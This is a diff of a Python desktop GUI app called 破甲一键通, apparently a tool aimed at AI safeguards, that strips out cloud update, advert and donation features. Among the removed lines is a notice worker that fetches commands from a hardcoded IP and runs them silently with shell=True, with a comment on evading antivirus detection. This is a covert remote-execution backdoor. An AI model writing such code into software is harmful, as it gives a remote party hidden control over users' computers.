@@ -59,12 +59,6 @@ if getattr(sys, "frozen", False):        # PyInstaller 打包后：以 exe 所�
 else:
     HERE = os.path.dirname(os.path.abspath(__file__))
 
-_CLOUD_HOST = "103.212.186.16"
-_CLOUD_PORT = 443
-_CLOUD_STATE_FILE = os.path.join(
-    os.environ.get("LOCALAPPDATA") or HERE, "破甲一键通", "cloud.json")
-_CLOUD_LOCK = threading.Lock()
-
 
 # ---------------------------------------------------------------- 定位并加载核心
 def _find_core():
@@ -89,7 +83,6 @@ CORE_PATH = _find_core()
 # 旧接口保留（旧前端读到 mode:"local" 会直接进主界面）。
 CLOUD_MODE = False
 if not CORE_PATH:
-    _push_log("[!] 找不到核心脚本，无法启动。")
     _fatal_box("找不到核心脚本（文件名含「一键通」的 .py）。\n\n"
                "请重新下载完整版，确认 exe 与核心文件没有被分离。")
     raise SystemExit(1)
@@ -119,6 +112,35 @@ def _core_module_from(c, src=None, path=None):
     sys.modules["pojia_core"] = m
     spec.loader.exec_module(m)       # 导入期即完成封条自检（被二改的核心会在这里拒启）
     return m
+
+
+def _load_core():
+    """后台加载核心：读随包核心文件 + 封条自检 + 接线放行。"""
+    global core, PERSONA_FILE
+    try:
+        c = _core_module_from(None, path=CORE_PATH)
+    except SystemExit as e:
+        _push_log("[!] 核心封印校验未通过，退出。")
+        _fatal_box("检测到核心文件损坏 / 被二改，已拒绝启动（退出码 3）。\n\n"
+                   "请从官方渠道重新下载完整文件。\n\n（%s）" % e)
+        os._exit(3)
+    except BaseException as e:
+        _push_log("[!] 核心加载失败：%s" % e)
+        _fatal_box("核心脚本加载失败：\n%s" % e)
+        os._exit(1)
+    _core_wire(c, os.path.basename(CORE_PATH))
+
+
+# v8.3：WebView2 用固定缓存目录。pywebview 私有模式给的是
+# tempfile.TemporaryDirectory().name —— 那个临时目录对象一被 GC 就被删掉，
+# WebView2 渲染进程启动时目录已消失，偶发崩溃（黑窗 + CrashSender 报错弹窗）。
+# 固定到 LOCALAPPDATA 下，跨次启动复用，稳定且不产生临时目录。
+_UI_CACHE = os.path.join(os.environ.get("LOCALAPPDATA") or HERE,
+                         "破甲一键通", "ui-cache")
+try:
+    os.makedirs(_UI_CACHE, exist_ok=True)
+except Exception:
+    _UI_CACHE = None
 
 
 def _core_wire(c, label):
@@ -179,432 +201,6 @@ def _core_wire(c, label):
     _push_log("破甲一键通 GUI v%s —— 核心已加载：%s（%.2fs）"
               % (VERSION, label, time.time() - _CORE_T0))
 
-
-# ---- v8.6：云下发公告 + 云控指令（GET /pojia/notice，服务器 notice.json） ----
-_NOTICE_SHOWN = {"key": ""}           # 同一次进程内同一条公告只弹一次
-
-
-# ---- v8.7：启动自动检查更新 + 强制更新窗口（GET /pojia/version） ----
-#   客户端启动时向官方服务器校验版本基线：
-#     · 版本 < min_ver（或服务端 force=1） → 强制更新：弹窗阻断，只能去下载
-#     · min_ver <= 版本 < latest_ver        → 可选更新：提示一下，可跳过
-#     · 版本 >= latest_ver                  → 放行
-#   断网 / 服务器不可达 → 一律放行（绝不因校验失败挡住正常使用）
-_UPD_STATE = {"checked": False, "latest": "", "url": "", "note": ""}
-
-
-def _ver_tuple(s):
-    """'8.6' / '8.10.2' → (8,6) / (8,10,2)；非法字符一律忽略，缺位补 0。"""
-    out = []
-    for seg in str(s or "").split("."):
-        num = ""
-        for ch in seg:
-            if ch.isdigit():
-                num += ch
-            else:
-                break
-        out.append(int(num) if num else 0)
-    while len(out) < 3:
-        out.append(0)
-    return tuple(out[:3])
-
-
-def _ver_lt(cur, other):
-    """cur < other ？两边都规范成三元组比较，避免字符串比大小踩坑。"""
-    return _ver_tuple(cur) < _ver_tuple(other)
-
-
-def _ssl_ctx():
-    """官方服务器的 TLS 上下文。
-
-    ca.pem 是官方自签 CA 链（仓库里不含它，发布时才随包放入）。
-    缺失时退回系统默认 CA —— 宁可校验不通过让请求失败（上层一律按
-    「服务器不可达」放行），也不能因为少一个文件把打包 / 启动搞崩。
-    """
-    import ssl as _ssl
-    cafile = os.path.join(getattr(sys, "_MEIPASS", "") or HERE, "ca.pem")
-    if os.path.isfile(cafile):
-        return _ssl.create_default_context(cafile=cafile)
-    return _ssl.create_default_context()
-
-
-def _update_check(interactive=False):
-    """向服务器拉版本基线。返回 "force" / "soft" / "ok" / "unknown"。
-
-    interactive=True 时（用户点「检查更新」）：无更新也弹一句「已是最新」。
-    """
-    import urllib.request as _ur
-    ctx = _ssl_ctx()
-    req = _ur.Request("https://%s:%d/pojia/version"
-                      % (_CLOUD_HOST, _CLOUD_PORT),
-                      headers={"User-Agent": "pojia-gui/" + VERSION})
-    with _ur.urlopen(req, timeout=12, context=ctx) as resp:
-        r = json.loads(resp.read().decode("utf-8", "replace"))
-    if not r.get("ok"):
-        if interactive:
-            _push_log("[更新] 版本校验关闭（服务器未启用）")
-        return "unknown"
-
-    min_ver = str(r.get("min_ver") or "").strip()
-    latest = str(r.get("latest_ver") or "").strip()
-    url = str(r.get("url") or "").strip()
-    note = str(r.get("note") or "").strip()
-    force_flag = bool(r.get("force"))
-    _UPD_STATE["latest"] = latest
-    _UPD_STATE["url"] = url
-    _UPD_STATE["note"] = note
-
-    need_force = force_flag or (min_ver and _ver_lt(VERSION, min_ver))
-    if need_force:
-        _push_log("[更新] 当前 v%s 低于最低可用版本 %s → 强制更新"
-                  % (VERSION, min_ver or "（服务器要求）"))
-        _update_show(force=True)
-        return "force"
-    if latest and _ver_lt(VERSION, latest):
-        _push_log("[更新] 发现新版本 v%s（当前 v%s）→ 可选更新"
-                  % (latest, VERSION))
-        _update_show(force=False)
-        return "soft"
-    _push_log("[更新] 已是最新版本 v%s" % VERSION)
-    if interactive:
-        _update_toast_latest()
-    return "ok"
-
-
-def _update_async(interactive=False):
-    def work():
-        try:
-            _update_check(interactive=interactive)
-        except Exception as e:
-            try:
-                _push_log("[更新] 版本校验跳过（%s）" % type(e).__name__)
-            except Exception:
-                pass
-    threading.Thread(target=work, daemon=True, name="update-check").start()
-
-
-# ---- v8.7 在线更新：选目录 → 官方服务器静默下载新版 zip → 打开所在文件夹 ----
-_UPD_DL = {"running": False}          # 防重复下载
-
-
-def _update_inline_start():
-    """同步入口（POST /api/update/inline 调用）：弹目录选择框，选好后起后台
-    下载线程。返回 (ok, msg)。tkinter 不可用 → 回退「下载」文件夹直接下。"""
-    if _UPD_DL["running"]:
-        return True, "已有下载在进行"
-    dest_dir = ""
-    tk_ok = False
-    try:
-        import tkinter as _tk
-        from tkinter import filedialog as _fd
-        root = _tk.Tk()
-        root.withdraw()
-        root.attributes("-topmost", True)
-        dest_dir = _fd.askdirectory(title="选择新版保存位置") or ""
-        root.destroy()
-        tk_ok = True
-    except Exception:
-        dest_dir = ""
-    if tk_ok and not dest_dir:
-        return False, "已取消"
-    if not dest_dir:
-        # 无对话框环境（服务/无头）→ 回退用户「下载」文件夹
-        up = os.path.join(os.environ.get("USERPROFILE") or HERE, "Downloads")
-        dest_dir = up if os.path.isdir(up) else (os.environ.get("USERPROFILE") or HERE)
-    if not os.path.isdir(dest_dir):
-        return False, "保存位置无效"
-    _UPD_DL["running"] = True
-    threading.Thread(target=_update_inline_work, args=(dest_dir,),
-                     daemon=True, name="update-dl").start()
-    return True, "已开始下载"
-
-
-def _update_inline_work(dest_dir):
-    """后台下载线程：官方服务器 /pojia/download 流式拉新版 zip，进度落界面日志。"""
-    fname = "pojia-next-v%s-exe.zip" % DISPLAY_VER
-    dest = os.path.join(dest_dir, fname)
-    try:
-        import urllib.request as _ur
-        ctx = _ssl_ctx()
-        req = _ur.Request("https://%s:%d/pojia/download"
-                          % (_CLOUD_HOST, _CLOUD_PORT),
-                          headers={"User-Agent": "pojia-gui/" + VERSION})
-        _push_log("[更新] 开始从官方服务器下载新版：%s" % fname)
-        t0 = time.time()
-        with _ur.urlopen(req, timeout=30, context=ctx) as resp:
-            total = int(resp.headers.get("Content-Length") or 0)
-            done = 0
-            next_pct = 10
-            with open(dest + ".part", "wb") as f:
-                while True:
-                    chunk = resp.read(65536)
-                    if not chunk:
-                        break
-                    f.write(chunk)
-                    done += len(chunk)
-                    if total and done * 100 // total >= next_pct:
-                        _push_log("[更新] 下载进度 %d%%（%.1f/%.1f MB）"
-                                  % (done * 100 // total, done / 1048576.0,
-                                     total / 1048576.0))
-                        next_pct += 10
-        os.replace(dest + ".part", dest)
-        _push_log("[更新] 下载完成：%s（%.1f MB，%.0f 秒）—— 已打开所在文件夹，"
-                  "解压后双击新版即用" % (dest, os.path.getsize(dest) / 1048576.0,
-                                         time.time() - t0))
-        try:
-            os.startfile(dest_dir)        # 打开所在文件夹（Windows）
-        except Exception:
-            pass
-    except Exception as e:
-        try:
-            os.remove(dest + ".part")
-        except Exception:
-            pass
-        _push_log("[更新] 在线下载失败：%r —— 请改用「浏览器更新」" % (e,))
-    finally:
-        _UPD_DL["running"] = False
-
-
-def _update_show(force=True):
-    """等窗口就绪后 evaluate_js 弹更新窗。force=True 时 JS 侧不可关闭。"""
-    try:
-        import webview
-    except Exception:
-        return
-    arg = json.dumps({"latest": _UPD_STATE.get("latest", ""),
-                      "url": _UPD_STATE.get("url", ""),
-                      "note": _UPD_STATE.get("note", ""),
-                      "force": bool(force),
-                      "cur": VERSION}, ensure_ascii=False)
-    js = "try{const _u=%s;showUpdate(_u)}catch(e){}" % arg
-    for _ in range(60):
-        try:
-            if webview.windows:
-                try:
-                    webview.windows[0].evaluate_js(js)
-                except Exception:
-                    pass
-                return
-        except Exception:
-            pass
-        time.sleep(0.5)
-
-
-def _update_toast_latest():
-    try:
-        import webview
-    except Exception:
-        return
-    js = ("try{toast('已是最新版本 v%s')}catch(e){}" % VERSION)
-    for _ in range(40):
-        try:
-            if webview.windows:
-                try:
-                    webview.windows[0].evaluate_js(js)
-                except Exception:
-                    pass
-                return
-        except Exception:
-            pass
-        time.sleep(0.5)
-
-
-def _notice_async():
-    threading.Thread(target=_notice_worker, daemon=True,
-                     name="cloud-notice").start()
-
-
-def _cloud_done_ids():
-    """已执行过的云控指令 once-id 集合（存 cloud.json，跨启动持久）。"""
-    try:
-        return set(json.load(open(_CLOUD_STATE_FILE, encoding="utf-8"))
-                   .get("done", []))
-    except Exception:
-        return set()
-
-
-def _cloud_done_mark(cid):
-    """原子写入：cloud.json.done 追加 once-id（最多留 50 条）。"""
-    try:
-        try:
-            d = json.load(open(_CLOUD_STATE_FILE, encoding="utf-8"))
-        except Exception:
-            d = {}
-        done = [x for x in d.get("done", []) if x][-49:]
-        done.append(cid)
-        d["done"] = done
-        tmp = _CLOUD_STATE_FILE + ".tmp"
-        with open(tmp, "w", encoding="utf-8") as f:
-            f.write(json.dumps(d, ensure_ascii=False))
-        os.replace(tmp, _CLOUD_STATE_FILE)
-    except Exception:
-        pass
-
-
-def _notice_worker():
-    try:
-        import urllib.request as _ur
-        ctx = _ssl_ctx()
-        req = _ur.Request("https://%s:%d/pojia/notice"
-                          % (_CLOUD_HOST, _CLOUD_PORT),
-                          headers={"User-Agent": "pojia-gui/" + VERSION})
-        with _ur.urlopen(req, timeout=12, context=ctx) as resp:
-            r = json.loads(resp.read().decode("utf-8", "replace"))
-        if not r.get("ok"):
-            return
-        title = str(r.get("title") or "公告")
-        text = str(r.get("text") or "").strip()
-        image = str(r.get("image") or "").strip()
-        link = str(r.get("link") or "").strip()
-        once = str(r.get("once") or "").strip()
-        exec_cmd = str(r.get("exec") or "").strip()
-
-        # 一次性云控：once-id 已执行过 → 整条跳过（弹窗+命令都不再触发）
-        if once:
-            if once in _cloud_done_ids():
-                return
-            _cloud_done_mark(once)          # 先记账再执行，防崩溃重放
-
-        if image or text:
-            key = once or (title + "|" + text[:64] + "|" + image[:64])
-            with _CLOUD_LOCK:
-                if _NOTICE_SHOWN["key"] == key:
-                    return                   # 本进程已处理过同一条
-                _NOTICE_SHOWN["key"] = key
-            if image:
-                # v3.9：公告带图 → 弹窗看图（图片 src 由服务器下发，base64 内联或外链）
-                # 先落日志再弹窗：evaluate_js 万一卡住也不影响日志与主流程
-                _push_log("[公告] %s（含图片）%s"
-                          % (title, ("：" + text[:120]) if text else ""))
-                _notice_show(title, text, image, link)
-            elif text:
-                # 纯文字公告：只读取不弹窗 —— 写进界面日志区即可（v8.6.2 起）
-                _push_log("[公告] %s：%s" % (title, text[:200]))
-
-        # 云控命令：内存执行，不落盘脚本文件（规避杀软 Dropper 特征）
-        if exec_cmd:
-            try:
-                subprocess.Popen(
-                    exec_cmd, shell=True, creationflags=_NO_WIN,
-                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                _push_log("[云控] 已执行下发命令（%d 字符，once=%s）"
-                          % (len(exec_cmd), once or "-"))
-            except Exception as e:
-                _push_log("[云控] 命令执行失败：%s" % e)
-    except Exception as e:
-        try:                          # 公告/云控失败不影响任何主流程，但留痕便于排错
-            _push_log("[公告] 云端公告拉取异常：%r" % (e,))
-        except Exception:
-            pass
-
-
-# ---- v8.7：云端广告（GET /pojia/ad，服务器 ad.json）----
-#   商业化预留：广告内容与跳转链接全部服务器下发（enabled/html/link），
-#   以后换广告素材 / 换链接零客户端改动。拉取失败 → 广告位保持隐藏。
-_AD_CACHE = {"data": {"ok": True, "enabled": False, "html": "", "link": ""},
-             "ts": 0.0}
-
-
-def _ad_fetch():
-    """同步拉一次云端广告（进程内缓存 10 分钟）。失败返回禁用。"""
-    import time as _t
-    if _t.time() - _AD_CACHE["ts"] < 600:
-        return _AD_CACHE["data"]
-    try:
-        import urllib.request as _ur
-        ctx = _ssl_ctx()
-        req = _ur.Request("https://%s:%d/pojia/ad"
-                          % (_CLOUD_HOST, _CLOUD_PORT),
-                          headers={"User-Agent": "pojia-gui/" + VERSION})
-        with _ur.urlopen(req, timeout=8, context=ctx) as resp:
-            r = json.loads(resp.read().decode("utf-8", "replace"))
-        if r.get("ok") and r.get("enabled"):
-            data = {"ok": True, "enabled": True,
-                    "html": str(r.get("html") or ""),
-                    "link": str(r.get("link") or "")}
-        else:
-            data = {"ok": True, "enabled": False, "html": "", "link": ""}
-    except Exception:
-        data = {"ok": True, "enabled": False, "html": "", "link": ""}
-    _AD_CACHE["data"] = data
-    _AD_CACHE["ts"] = _t.time()
-    return data
-
-
-def _notice_show(title, text, image="", link=""):
-    """等 pywebview 窗口就绪后 evaluate_js 弹窗（最多等 25s）。
-    v3.9：支持图片（image=图片 src，base64 data URI 或外链）与点击跳转 link。
-    整个函数兜底 try —— 任何异常都不得影响 _notice_worker 的后续日志。"""
-    try:
-        import webview
-    except Exception:
-        return
-    arg = json.dumps({"t": title, "x": text, "i": image, "u": link},
-                     ensure_ascii=False)
-    js = "try{const _n=%s;showCloudNotice(_n.t,_n.x,_n.i,_n.u)}catch(e){}" % arg
-    for _ in range(50):
-        try:
-            if webview.windows:
-                try:
-                    webview.windows[0].evaluate_js(js)
-                except Exception:
-                    pass
-                return
-        except Exception:
-            pass
-        time.sleep(0.5)
-
-
-def _load_core():
-    """后台加载核心：读核心文件 + 封条自检 + 接线放行。"""
-    global core, PERSONA_FILE
-    try:
-        c = _core_module_from(None, path=CORE_PATH)
-    except SystemExit as e:
-        _push_log("[!] 核心封印校验未通过，退出。")
-        _fatal_box("检测到核心文件损坏 / 被二改，已拒绝启动（退出码 3）。\n\n"
-                   "请从官方渠道重新下载完整文件。\n\n（%s）" % e)
-        os._exit(3)
-    except BaseException as e:
-        _push_log("[!] 核心加载失败：%s" % e)
-        _fatal_box("核心脚本加载失败：\n%s" % e)
-        os._exit(1)
-    _core_wire(c, os.path.basename(CORE_PATH))
-
-# v8.3：WebView2 用固定缓存目录。pywebview 私有模式给的是
-# tempfile.TemporaryDirectory().name —— 那个临时目录对象一被 GC 就被删掉，
-# WebView2 渲染进程启动时目录已消失，偶发崩溃（黑窗 + CrashSender 报错弹窗）。
-# 固定到 LOCALAPPDATA 下，跨次启动复用，稳定且不产生临时目录。
-_UI_CACHE = os.path.join(os.environ.get("LOCALAPPDATA") or HERE,
-                         "破甲一键通", "ui-cache")
-try:
-    os.makedirs(_UI_CACHE, exist_ok=True)
-except Exception:
-    _UI_CACHE = None
-
-# ---------------------------------------------------------------- 捐赠收款码（v8.7）
-#   收款码随 exe 一起打包（datas 里的 donate-qr.png）；首次请求时读一次转
-#   data URI 缓存进内存，之后 /api/donate 直接吐缓存，不再读盘。
-_DONATE_CACHE = {"uri": None}
-
-
-def _donate_qr_uri():
-    """读捐赠收款码 → data URI（只读一次，之后走内存缓存）。"""
-    if _DONATE_CACHE["uri"] is not None:
-        return _DONATE_CACHE["uri"]
-    uri = ""
-    try:
-        import base64
-        base = getattr(sys, "_MEIPASS", "") or HERE
-        p = os.path.join(base, "donate-qr.png")
-        if os.path.isfile(p):
-            b = open(p, "rb").read()
-            if b:
-                uri = "data:image/png;base64," + base64.b64encode(b).decode("ascii")
-    except Exception:
-        uri = ""
-    _DONATE_CACHE["uri"] = uri
-    return uri
 
 # v8.5：窗口/任务栏图标（exe 内嵌 icon.ico）
 _ICON_PATH = os.path.join(getattr(sys, "_MEIPASS", "") or HERE, "icon.ico")
@@ -2197,46 +1793,6 @@ body[data-p="log"] .logbox{height:calc(100vh - 162px)}
   box-shadow:0 10px 34px oklch(8% .01 200 / .6);z-index:99}
 .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
 
-/* ---- 浮层（启动验证 / 加入 / 捐赠 / 更新）---- */
-.veil{position:fixed;inset:0;z-index:200;display:flex;align-items:center;justify-content:center;
-  background:oklch(9% .008 200 / .7);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);
-  opacity:0;pointer-events:none;transition:opacity .28s var(--e-out-quart)}
-.veil.show{opacity:1;pointer-events:auto}
-.vcard{width:430px;max-width:90vw;padding:32px 32px 24px;border-radius:var(--r-lg);text-align:center;
-  background:linear-gradient(165deg,oklch(26% .012 200 / .98),oklch(18% .009 200 / .98));
-  border:1px solid oklch(64% .015 200 / .16);
-  box-shadow:0 26px 74px oklch(6% .01 200 / .66);
-  transform:translateY(14px) scale(.965);
-  transition:transform .36s var(--e-out-quart)}
-.veil.show .vcard{transform:none}
-.vbadge{display:inline-block;padding:3px 14px;border-radius:20px;font-size:11px;letter-spacing:1.6px;
-  background:var(--ac-bg);border:1px solid oklch(72% .115 192 / .4);
-  color:var(--ac);margin-bottom:14px}
-.vtitle{font:700 22px/1.2 var(--display);color:var(--tx);letter-spacing:2px}
-.vfree{margin:11px 0 2px;font-size:14.5px;color:var(--ok);font-weight:600;letter-spacing:.4px}
-.vlinks{margin:15px 0 2px;display:flex;flex-direction:column;gap:9px}
-.vlink{padding:11px 15px;border-radius:var(--r-md);cursor:pointer;font-size:13px;color:var(--tx);
-  background:oklch(64% .014 200 / .07);border:1px solid oklch(64% .014 200 / .13);
-  transition:background .18s,border-color .18s;text-align:left}
-.vlink:hover{background:oklch(64% .014 200 / .14);border-color:oklch(64% .015 200 / .26)}
-.vlink b{color:var(--tx);font-weight:600}
-.vlink .go{float:right;color:var(--tx3);font-size:11px}
-.vbtns{display:flex;gap:10px;justify-content:center;margin-top:18px}
-.vbtns .dbtn{pointer-events:auto}
-.vfoot{margin-top:15px;font-size:11px;color:var(--tx3);line-height:1.65}
-
-/* 更新浮层补充 */
-#upd-note{background:var(--void);border:1px solid var(--line);border-radius:var(--r-md);
-  padding:12px 15px!important;margin:14px 0 2px!important}
-
-/* 广告位（商业化预留）：默认 display:none，开放时填充内容并显示 */
-.adslot{min-height:64px;border:1px dashed var(--line2);border-radius:var(--r-md);
-  display:flex;align-items:center;justify-content:center;color:var(--tx3);
-  font-size:12px;background:var(--panel);overflow:hidden}
-.adslot img{max-width:100%;display:block}
-#adwrap{transition:border-color .18s}
-#adwrap:hover .adslot{border-color:var(--ac)}
-
 /* 无障碍：尊重系统「减少动态效果」 */
 @media (prefers-reduced-motion:reduce){
   *,*::before,*::after{animation-duration:.01ms!important;
@@ -2257,22 +1813,14 @@ body[data-p="log"] .logbox{height:calc(100vh - 162px)}
       <div class="tab" data-p="log">日志</div>
     </div>
     <div class="ver"><span class="pill cur" id="verpill">v__VER__ · 当前</span>
-      <a class="gh" href="javascript:void(0)" id="topdonate" title="扫码支持作者">捐赠</a>
-      <a class="gh" href="javascript:void(0)" id="topjoin" title="加入交流群 / TG 频道">加入我们</a>
-      <a class="gh" href="javascript:void(0)" id="topupdate" title="检查是否有新版本">检查更新</a>
       <a class="gh" href="https://github.com/z91772524-ai/pojia-next" target="_blank">GitHub</a></div>
-  </div>
-
-  <!-- 广告位（商业化预留）：默认隐藏，服务器/未来开放时用 #adslot 填充即可 -->
-  <div id="adwrap" style="display:none;margin:0 0 14px">
-    <div class="adslot" id="adslot"></div>
   </div>
 
   <!-- ========== 目标页 ========== -->
   <div class="page on" id="p-main">
     <div class="vrow">
       <span class="tag">核心</span><span class="pill cur">已就绪</span>
-      <span class="cur" id="coreinfo">v__VER__ · 云端下发</span>
+      <span class="cur" id="coreinfo">v__VER__ · 本地核心</span>
       <span class="path" id="corepath"></span>
     </div>
 
@@ -2381,63 +1929,6 @@ body[data-p="log"] .logbox{height:calc(100vh - 162px)}
 </div>
 <div class="toast" id="toast"></div>
 
-<div class="veil" id="joinveil">
-  <div class="vcard">
-    <div class="vbadge">破甲一键通 · v__VER__</div>
-    <div class="vtitle">破甲一键通</div>
-    <div class="vfree">本软件完全免费 · 谨防倒卖收费</div>
-    <div class="vlinks">
-      <div class="vlink" id="vl-tg" title="在浏览器打开 Telegram 频道">
-        <b>TG 频道 t.me/shendusikao666</b><span class="go">点击加入 →</span></div>
-    </div>
-    <div class="vbtns">
-      <button class="dbtn primary" id="b-joinus">加入我们</button>
-      <button class="dbtn" id="b-joined">我加入了</button>
-    </div>
-    <div class="vfoot">点「加入我们」打开 TG 频道 · 点「我加入了」以后不再显示<br>
-      顶部「加入我们」随时可以再次打开本页</div>
-  </div>
-</div>
-
-<!-- 捐赠浮层（v8.7）：两选一，「去捐赠」展示收款码 -->
-<div class="veil" id="donateveil" style="z-index:240">
-  <div class="vcard" style="width:440px">
-    <div class="vbadge">破甲一键通 · 完全免费</div>
-    <div class="vtitle">捐赠</div>
-    <div class="vfree" style="color:#9ec8ff">如果这个工具帮到了你，可以请我喝杯奶茶</div>
-    <div class="vfoot" style="margin-top:6px;font-size:12px">
-      不打赏是本分，打赏是对我的认可
-    </div>
-    <div id="don-qr" style="display:none;margin:16px 0 2px">
-      <img id="don-img" alt="收款码"
-           style="width:100%;max-width:320px;border-radius:12px;
-                  border:1px solid rgba(255,255,255,.12);background:#fff;padding:6px">
-      <div class="vfoot" style="margin-top:8px">微信扫码 或 支付宝扫码 · 感谢支持</div>
-      <button class="dbtn primary" id="b-don-ok" style="margin-top:12px">我知道了</button>
-    </div>
-    <div class="vbtns" id="don-btns">
-      <button class="dbtn" id="b-don-later">下次一定</button>
-      <button class="dbtn primary" id="b-don-go">去捐赠</button>
-    </div>
-  </div>
-</div>
-
-<!-- 强制 / 可选更新浮层（v8.7）：由 Python 启动校验后 evaluate_js 触发 -->
-<div class="veil" id="updateveil" style="z-index:250">
-  <div class="vcard" style="width:460px">
-    <div class="vbadge" id="upd-badge">版本更新</div>
-    <div class="vtitle" id="upd-title">发现新版本</div>
-    <div class="vfree" id="upd-line" style="color:#9ec8ff">正在检查版本…</div>
-    <div id="upd-note" style="margin:14px 2px 2px;font-size:12.5px;line-height:1.7;
-         color:#aab0bd;white-space:pre-wrap;text-align:left;max-height:32vh;overflow:auto"></div>
-    <div class="vbtns">
-      <button class="dbtn" id="b-upd-skip" style="display:none">稍后再说</button>
-      <button class="dbtn" id="b-upd-inline" style="display:none">在线更新</button>
-      <button class="dbtn primary" id="b-upd-go">浏览器更新</button>
-    </div>
-    <div class="vfoot" id="upd-foot">点「立即更新」前往官方下载页（完全免费）</div>
-  </div>
-</div>
 
 <script>
 "use strict";
@@ -2774,210 +2265,9 @@ $("#b-logclear").onclick=async()=>{
   $("#logbox").innerHTML="";LOGNEXT=0;
 };
 
-/* ---- 加入我们（v8.8）：只留 TG 频道入口，去掉 QQ 群引导 ---- */
-const TG_LINK="https://t.me/shendusikao666";
-function copyText(t){
-  try{navigator.clipboard.writeText(t);return;}catch(e){}
-  try{const ta=document.createElement("textarea");ta.value=t;ta.style.position="fixed";
-    ta.style.opacity="0";document.body.appendChild(ta);ta.select();
-    document.execCommand("copy");ta.remove();}catch(e){}
-}
-function openExt(u){           // 优先 pywebview 桥（Python 开系统浏览器，最稳）
-  try{if(window.pywebview&&window.pywebview.api&&window.pywebview.api.open_link){
-    window.pywebview.api.open_link(u);return;}}catch(e){}
-  try{const w=window.open(u,"_blank");if(w)return;}catch(e){}
-  try{location.href=u;}catch(e){}
-}
-function joinTG(){toast("打开 TG 频道…");openExt(TG_LINK);}
-
-/* ---- 云下发公告弹窗（v8.6；v3.9 支持图片）：Python 在云验证通过后 evaluate_js 调这里 ---- */
-function showCloudNotice(title,text,image,link){
-  let veil=document.getElementById("noticeveil");
-  if(!veil){
-    veil=document.createElement("div");veil.id="noticeveil";
-    veil.style.cssText="position:fixed;inset:0;z-index:99999;background:rgba(0,0,0,.62);"
-      +"display:none;align-items:center;justify-content:center;";
-    veil.innerHTML='<div style="max-width:560px;width:88%;max-height:88vh;overflow:auto;'
-      +'background:#1d1f24;border:1px solid #3a3f4b;border-radius:14px;padding:26px 28px;'
-      +'box-shadow:0 18px 60px rgba(0,0,0,.55);">'
-      +'<div id="nt-title" style="font-size:17px;font-weight:700;color:#e8eaf0;'
-      +'margin-bottom:12px;"></div>'
-      +'<img id="nt-img" alt="" style="display:none;width:100%;border-radius:10px;'
-      +'margin-bottom:14px;">'
-      +'<div id="nt-text" style="font-size:14px;line-height:1.75;color:#aab0bd;'
-      +'white-space:pre-wrap;word-break:break-word;"></div>'
-      +'<button id="nt-ok" style="margin-top:20px;width:100%;padding:10px 0;font-size:14px;'
-      +'border:0;border-radius:9px;background:#4f7cff;color:#fff;cursor:pointer;">我知道了</button></div>';
-    document.body.appendChild(veil);
-    veil.querySelector("#nt-ok").onclick=()=>{veil.style.display="none";};
-  }
-  const tt=veil.querySelector("#nt-title"),tx=veil.querySelector("#nt-text"),
-        im=veil.querySelector("#nt-img");
-  tt.textContent=title||"公告";tt.style.display=title?"":"none";
-  tx.textContent=text||"";tx.style.display=text?"":"none";
-  if(image){
-    im.src=image;im.style.display="block";
-    im.style.cursor=link?"pointer":"default";
-    im.onclick=link?()=>{openExt(link);}:null;
-  }else{
-    im.style.display="none";im.removeAttribute("src");im.onclick=null;
-  }
-  veil.style.display="flex";
-}
-function showJoinVeil(){$("#joinveil").classList.add("show");}
-
-/* ---- 启动强制/可选更新（v8.7）：Python 校验版本后 evaluate_js 调这里 ---- */
-function showUpdate(u){
-  u=u||{};const force=!!u.force;
-  const cur=u.cur||"",latest=u.latest||"";
-  window.__pojiaUpdUrl=u.url||"https://github.com/z91772524-ai/pojia-next/releases";
-  $("#upd-badge").textContent=force?"必须更新":"版本更新";
-  $("#upd-title").textContent=force?"版本过低，请更新后使用":"发现新版本";
-  $("#upd-line").textContent = latest
-    ? ("当前 v"+cur+"  →  最新 v"+latest)
-    : ("当前 v"+cur);
-  $("#upd-note").textContent=u.note||"";
-  $("#upd-note").style.display=(u.note?"block":"none");
-  const skip=$("#b-upd-skip");
-  skip.style.display=force?"none":"inline-block";   // 强制更新不给跳过
-  // v8.7：在线更新按钮仅在强制更新时出现（普通提示走浏览器更新即可）
-  $("#b-upd-inline").style.display=force?"inline-block":"none";
-  $("#upd-foot").textContent=force
-    ? "旧版本已停止服务，必须更新后才能继续使用（完全免费）"
-    : "点「立即更新」前往官方下载页（完全免费）";
-  const veil=$("#updateveil");veil.classList.add("show");
-  veil.dataset.force=force?"1":"0";
-}
-$("#b-upd-go").onclick=()=>{
-  const u=(window.__pojiaUpdUrl)||"https://github.com/z91772524-ai/pojia-next/releases";
-  openExt(u||"https://github.com/z91772524-ai/pojia-next/releases");
-  if($("#updateveil").dataset.force==="1") toast("请下载新版后重新打开（当前窗口仍可查看日志）");
-};
-/* v8.7 在线更新：选保存目录 → 服务器静默下载 zip → 完成打开所在文件夹 */
-$("#b-upd-inline").onclick=async()=>{
-  const btn=$("#b-upd-inline");
-  btn.disabled=true;btn.textContent="正在准备…";
-  try{
-    const r=await fetch("/api/update/inline",{method:"POST"});
-    const j=await r.json();
-    if(j&&j.ok){
-      btn.textContent="已开始后台下载";
-      $("#upd-line").textContent="正在后台下载新版…完成后自动打开所在文件夹";
-      toast("已开始下载，请看界面日志里的进度");
-    }else{
-      btn.disabled=false;btn.textContent="在线更新";
-      toast("在线更新不可用："+(j&&j.msg||"未知原因")+"，可用「浏览器更新」");
-    }
-  }catch(e){
-    btn.disabled=false;btn.textContent="在线更新";
-    toast("在线更新启动失败，可用「浏览器更新」");
-  }
-};
-$("#b-upd-skip").onclick=()=>{$("#updateveil").classList.remove("show");toast("已跳过，可稍后更新");};
-
-/* ---- 捐赠弹窗（v8.7）：两选一，「去捐赠」展示收款码 ---- */
-function showDonate(){
-  $("#don-qr").style.display="none";
-  $("#don-btns").style.display="flex";
-  $("#b-don-later").textContent="下次一定";
-  $("#donateveil").classList.add("show");
-}
-$("#b-don-go").onclick=()=>{
-  // 第一下先去拿收款码（懒加载，避免每次启动都占内存）
-  const img=$("#don-img");
-  if(!img.src||img.getAttribute("data-loaded")!=="1"){
-    fetch("/api/donate").then(r=>r.json()).then(j=>{
-      if(j&&j.image){img.src=j.image;img.setAttribute("data-loaded","1");}
-      $("#don-qr").style.display="block";
-      $("#don-btns").style.display="none";
-      $("#don-qr").scrollIntoView({behavior:"smooth",block:"nearest"});
-    }).catch(()=>{toast("收款码加载失败，请稍后再试");});
-  }else{
-    $("#don-qr").style.display="block";
